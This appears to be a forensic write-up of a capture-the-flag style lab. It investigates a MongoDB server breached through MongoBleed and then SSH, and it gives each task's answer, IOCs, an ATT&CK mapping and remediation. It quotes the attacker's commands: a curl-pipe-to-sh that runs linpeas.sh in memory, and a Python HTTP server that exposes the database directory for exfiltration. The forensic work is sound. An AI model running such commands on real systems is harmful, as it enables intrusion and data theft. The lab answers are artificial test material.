<img src="Images/MangoBleed%20-%20Logo.png" width="240">

# Timeline

|Time (UTC)|Event|Source|
|---|---|---|
|2025-12-29 05:11:47|`mongod` **8.0.16** started on `mongodbsync` (`ip-172-31-38-170`)|`mongod.log`|
|2025-12-29 05:25:52|First MongoBleed (CVE-2025-14847) connection from `65.0.76.43`|`mongod.log`|
|2025-12-29 05:27:07|Last MongoBleed connection: 37,630 connections in about 75 seconds, with no client metadata|`mongod.log`|
|Before 05:39:24|SSH brute-force attempts from `65.0.76.43` against `mongodbsync`|`auth.log`|
|2025-12-29 05:39:24|First successful SSH authentication as `mongoadmin` from `65.0.76.43` (port `55056`), likely the brute-force tool validating the credentials|`auth.log`|
|2025-12-29 05:40:03|Interactive hands-on SSH session as `mongoadmin` from `65.0.76.43` (port `46062`)|`auth.log`|
|After 05:40:03 (no timestamp, order from history)|Discovery (`whoami`, `ls -la`) and in-memory execution of `linpeas.sh` piped from GitHub into `sh`|`mongoadmin`'s `.bash_history`|
|After 05:40:03 (no timestamp, order from history)|Browsing of `/var/lib/mongodb/` and installation of `zip`|`mongoadmin`'s `.bash_history`|
|After 05:40:03 (no timestamp, order from history)|`python3 -m http.server 6969` started from `/var/lib/mongodb/` to expose the database files|`mongoadmin`'s `.bash_history`|

# Table of Contents

- [Timeline](#timeline)
- [Introduction](#introduction)
    - [Scenario](#scenario)
    - [Artefacts](#artefacts)
- [Tasks](#tasks)
    - [Task 1](#task-1)
    - [Task 2](#task-2)
    - [Task 3](#task-3)
    - [Task 4](#task-4)
    - [Task 5](#task-5)
    - [Task 6](#task-6)
    - [Task 7](#task-7)
    - [Task 8](#task-8)
- [Indicators of Compromise](#indicators-of-compromise)
- [MITRE ATT&CK](#mitre-attck)
- [Remediation](#remediation)

---

# Introduction

## Scenario

> You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.
>
> You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

## Artefacts

We started the Sherlock with the `MangoBleed.zip` file. It contained a UAC triage acquisition called `uac-mongodbsync-linux-triage`.

# Tasks

## Task 1

**What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?**

The CVE ID related to `MongoBleed` is `CVE-2025-14847`. It's a critical memory disclosure vulnerability in **MongoDB**'s zlib decompression, allowing unauthenticated attackers to leak uninitialized heap memory containing credentials and secrets. **MongoDB** discovered the flaw on **December 12, 2025**, and patched it in versions **8.2.3**, **8.0.17**, **7.0.28**, and **6.0.27**.

**ANSWER:** `CVE-2025-14847`

## Task 2

**What is the version of MongoDB installed on the server that the CVE exploited?**

After extracting the files from the archive and moving into `[root]`, we found the version of **MongoDB** by searching its log for the keyword `version`.

```
cat var/log/mongodb/mongod.log | grep "version"

{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}

<SNIP>
```

The version was `8.0.16`.

**ANSWER:** `8.0.16`

## Task 3

**Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.**

Exploiting the CVE generates **100,000+ connections per minute** with almost no metadata exchanged. We had to look for event **22943** (connection accepted) followed by event **22944** (connection ended), with no matching client metadata event (**51800**). To detect whether the CVE was exploited, we [used](https://github.com/Neo23x0/mongobleed-detector) this GitHub repository.

```
./mongobleed-detector.sh --no-default-paths -p "../uac-mongodbsync-linux-triage/\[root\]/var/log/mongodb/mongod.log" -t 10000000
INFO: Analyzing 1 log file(s)...
INFO: Time window: 2007-11-07T06:22:13Z to now

╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                              MongoBleed (CVE-2025-14847) Detection Results                                       ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

Analysis Parameters:
  Time Window:        10000000 minutes
  Connection Thresh:  100
  Burst Rate Thresh:  400/min
  Metadata Rate:      0.10

Risk     SourceIP                                  ConnCount  MetaCount  DiscCount    MetaRate%    BurstRate/m FirstSeen (UTC)        LastSeen (UTC)
-------- ---------------------------------------- ---------- ---------- ---------- ------------ -------------- ---------------------- ----------------------
HIGH     65.0.76.43                                    37630          0      37630        0.00%       30104.00 2025-12-29T05:25:52Z   2025-12-29T05:27:07Z

═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════
Summary:
  HIGH:   1 source(s) - Likely exploitation detected

⚠ IMPORTANT: If exploitation is confirmed, patching alone is insufficient.
  - Rotate all credentials that may have been exposed
  - Review accessed data for sensitive information disclosure
  - Check for lateral movement from affected systems
  - Preserve logs for forensic analysis
```

We had to set the time window to `10000000` minutes to make sure the script analysed the log from the beginning.

This revealed that the CVE was exploited from the IP `65.0.76.43` on `2025-12-29 05:25:52`.

**ANSWER:** `65.0.76.43`

## Task 4

**Based on the MongoDB logs, determine the exact date and time the attacker's exploitation activity began (the earliest confirmed malicious event)**

We could answer this task from the previous analysis.

**ANSWER:** `2025-12-29 05:25:52`

## Task 5

**Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.**

We got the exact number of connections initiated by the attacker by adding `ConnCount` and `DiscCount` from the scanner output in Task 3.

We confirmed the number by counting how many times the attacker's IP address appeared in the log.

```
cat mongod.log| grep -i "65.0.76.43" |wc -l
75260
```

Each of the attacker's 37,630 connections left two lines in the log: an accepted event (`22943`) and an ended event (`22944`). That is why the IP appeared 75,260 times, exactly twice the `ConnCount` reported by the detector.

**ANSWER:** `75260`

## Task 6

**The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?**

The `auth.log` file records every authentication on the server along with its source IP, so we searched it for the attacker's IP.

```
cat var/log/auth.log | grep -i 65.0.76.43

<SNIP>

2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2

<SNIP>

2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2

<SNIP>
```

The log showed two successful authentications for `mongoadmin` from the attacker's IP. The first one, at `05:39:24`, came right after the brute-force attempts and was most likely the brute-force tool validating the credentials it had found, not a hands-on session. Less than a minute later, at `05:40:03`, the attacker logged in again from a different source port (`46062`, handled by a new `sshd` process `39962`), which was the interactive session they used to run their commands.

We concluded the attacker gained interactive hands-on access over SSH as `mongoadmin` on `2025-12-29 05:40:03`.

**ANSWER:** `2025-12-29 05:40:03`

## Task 7

**Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.**

We found the commands run by the attacker in the `.bash_history` of `mongoadmin`, the compromised user. The attacker didn't clear the file, so every command they ran was still visible.

```
cat home/mongoadmin/.bash_history

ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

The attacker first ran `whoami` to check which user they were, then executed `linpeas.sh`, a well-known tool that enumerates potential privilege-escalation paths. Piping `curl` straight into `sh` ran the script in memory without ever writing it to disk.

**ANSWER:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

## Task 8

**The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?**

From `mongoadmin`'s `.bash_history`, we observed that the attacker moved into `/var/lib/mongodb/`, the default MongoDB data directory, checked whether `zip` was available, then started a Python HTTP server on port `6969` from that directory to exfiltrate the MongoDB data.

**ANSWER:** `/var/lib/mongodb/`

# Indicators of Compromise

|Type|Value|Description|
|---|---|---|
|IPv4|`65.0.76.43`|Source of the MongoBleed exploitation, the SSH brute force and the SSH login|
|Log pattern|Bursts of event `22943` / `22944` with no `51800` (37,630 connections, ~30,000/min)|MongoBleed exploitation signature in `mongod.log`|
|Log pattern|`Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43`|Successful SSH login with the compromised account|
|Account|`mongoadmin`|Account compromised and used by the attacker|
|URL|`https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`|Privilege-escalation enumeration script downloaded by the attacker|
|Command|`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh`|In-memory execution of `linpeas.sh`|
|Command|`python3 -m http.server 6969`|HTTP server started from `/var/lib/mongodb/` to exfiltrate data|
|Network|TCP `6969` (listening)|Port of the exfiltration web server|

# MITRE ATT&CK

| Tactic              | Technique ID | Technique                                     | Evidence                                                                            |
| ------------------- | ------------ | --------------------------------------------- | ----------------------------------------------------------------------------------- |
| Credential Access   | T1212        | Exploitation for Credential Access            | MongoBleed (CVE-2025-14847) used to leak heap memory, likely exposing credentials   |
| Credential Access   | T1110        | Brute Force                                   | Series of SSH authentication attempts from `65.0.76.43` before the successful login |
| Initial Access      | T1078.003    | Valid Accounts: Local Accounts                | Login as `mongoadmin` with valid credentials                                        |
| Lateral Movement    | T1021.004    | Remote Services: SSH                          | Interactive SSH session from `65.0.76.43`                                           |
| Execution           | T1059.004    | Command and Scripting Interpreter: Unix Shell | Commands typed in the session and `linpeas.sh` piped into `sh`                      |
| Command and Control | T1105        | Ingress Tool Transfer                         | `linpeas.sh` downloaded from GitHub with `curl`                                     |
| Discovery           | T1033        | System Owner/User Discovery                   | `whoami`                                                                            |
| Discovery           | T1083        | File and Directory Discovery                  | `ls -la`, browsing of `/`, `/data` and `/var/lib/mongodb/`                          |
| Discovery           | T1082        | System Information Discovery                  | `linpeas.sh` enumeration of the host                                                |
| Collection          | T1005        | Data from Local System                        | Targeting of the MongoDB data files in `/var/lib/mongodb/`                          |
| Collection          | T1560.001    | Archive Collected Data: Archive via Utility   | `zip` installed, apparently to archive the data (no archive command was recorded)   |
| Exfiltration        | T1048.003    | Exfiltration Over Unencrypted Non-C2 Protocol | `python3 -m http.server 6969` serving `/var/lib/mongodb/` over HTTP                 |

# Remediation

| Priority | Action                        | Details                                                                                                                                                                                               |
| -------- | ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1        | Contain the host              | Isolate `mongodbsync` from the network, block `65.0.76.43` at the firewall and security-group level, and kill any remaining `mongoadmin` session and the Python HTTP server                           |
| 1        | Preserve evidence             | Keep the UAC acquisition and take a full disk and memory image before rebuilding, since the triage only covers part of the system                                                                     |
| 1        | Rotate every secret           | Assume anything held in MongoDB's memory leaked: reset the `mongoadmin` password, all MongoDB users, application connection strings, API keys and SSH keys on the host                                |
| 1        | Patch MongoDB                 | Upgrade from `8.0.16` to `8.0.17` or later. Until then, disable zlib network compression (`net.compression.compressors` without `zlib`)                                                               |
| 2        | Treat the data as exfiltrated | Assess what `/var/lib/mongodb/` contained (personal data, secrets) and start the data-breach process, including GDPR notification if personal data was involved                                       |
| 2        | Hunt for persistence          | Check `authorized_keys`, cron jobs, systemd units, new accounts and `sudo` logs on `mongodbsync`                                                                                                      |
| 2        | Hunt for lateral movement     | Look for `65.0.76.43` and `mongoadmin` logins on the other servers, starting with the primary MongoDB node                                                                                            |
| 2        | Reduce exposure               | Bind `mongod` to the private interface only and restrict port `27017` to the replica set members and the application servers                                                                          |
| 2        | Harden SSH                    | Disable password and `keyboard-interactive` authentication in favour of keys, add rate limiting (`fail2ban`), and expose SSH only through a bastion or VPN                                            |
| 3        | Improve detection             | Alert on bursts of MongoDB connections without client metadata (`22943`/`22944` without `51800`), on brute force followed by a successful SSH login, and on unexpected listening ports such as `6969` |
| 3        | Review the patch policy       | A monthly maintenance window is too slow for vulnerabilities in the CISA KEV catalog, which should be patched out of cycle                                                                            |

![MangoBleed - Solved](Images/MongoBleed%20-%20Solved.png)
